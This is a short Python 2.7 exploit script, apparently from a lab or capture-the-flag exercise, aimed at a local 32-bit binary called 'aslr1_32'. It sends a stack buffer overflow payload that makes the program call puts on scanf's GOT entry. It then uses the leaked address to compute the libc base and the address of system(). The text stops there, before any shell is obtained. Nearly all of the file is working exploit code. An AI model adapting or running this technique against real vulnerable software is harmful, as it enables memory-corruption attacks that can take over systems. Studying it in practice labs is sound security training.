#!/usr/bin/python2.7

import struct
import subprocess
import os
import pty

def readline(fd):
  res = ''
  try:
    while True:
      ch = os.read(fd, 1)
      res += ch
      if ch == '\n':
        return res
  except:
    raise

def writeline(proc, data):
  try:
    proc.stdin.write(data + '\n')
  except:
    raise

def p32(val):
  return struct.pack("<I", val)

def u32(data):
  return struct.unpack("<I", data)[0]

out_r, out_w = pty.openpty()
s = subprocess.Popen("./aslr1_32", stdin=subprocess.PIPE, stdout=out_w)

print `readline(out_r)`     # Hello World!\n
print `readline(out_r)`     # Hello ASLR!\n

payload  = "A"*40           # buf padding
payload += p32(0x8049036)   # ret addr (puts@plt + 6)
payload += p32(0xdeadbeef)  # ret after puts
payload += p32(0x804c014)   # scanf@got

writeline(s, payload)

out = readline(out_r)     # memory leakage of scanf@got

print `out`
scanf_addr = u32(out[:4])
print "scanf @ " + hex(scanf_addr)
libc = scanf_addr - 0x53ac0
print "libc @ " + hex(libc)
system = libc + 0x44620
print "system @ " + hex(system)
